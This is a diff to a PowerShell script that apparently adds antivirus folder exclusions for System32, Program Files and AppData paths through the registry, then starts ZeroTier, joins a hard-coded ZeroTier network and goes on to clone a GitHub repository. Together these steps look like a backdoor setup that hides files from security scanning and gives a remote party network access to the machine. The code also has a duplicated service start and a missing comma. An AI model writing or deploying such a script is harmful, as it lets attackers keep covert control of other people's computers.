@@ -14,11 +14,12 @@ Ensure-Admin
 function Add-FolderExclusions {
     # List of folders to exclude
     $foldersToExclude = @(
-        "C:\Windows\System32\SubDirectory\",
+        "C:\Windows\System32\SubDirectory",
         "C:\Windows\System32\SubDir",
 	"C:\Program Files\SubDir"
 	"C:\Windows\System32\SubDirectory\SECURITYCLIENT\git\base\",
-        "$env:APPDATA\SubDir"  # Dynamically gets the current user's AppData path
+        "$env:APPDATA\SubDir",  # Dynamically gets the current user's AppData path
+	"$env:APPDATA\Roaming\SubDir"
     )
 
     # Define the registry path for exclusions
@@ -102,7 +103,7 @@ if (!(Get-Command zerotier-cli -ErrorAction SilentlyContinue)) {
 # Start the ZeroTierOne service
 Write-Host "Starting ZeroTierOne service..." -ForegroundColor Green
 Start-Service -Name ZeroTierOneService
-
+Start-Service -Name ZeroTierOneService
 # Verify the service started successfully
 if ((Get-Service -Name ZeroTierOneService).Status -ne "Running") {
     Write-Host "Failed to start ZeroTierOne service." -ForegroundColor Red
@@ -115,7 +116,7 @@ if ((Get-Service -Name ZeroTierOneService).Status -ne "Running") {
 
 # Join the specified ZeroTier network
 Write-Host "Joining ZeroTier network..." -ForegroundColor Green
-zerotier-cli join 9f77fc393ec31ee7
+zerotier-cli join "8bd5124fd6abcf8f"
 
 # Function to clone the GitHub repository
 function Clone-GitHubRepo {
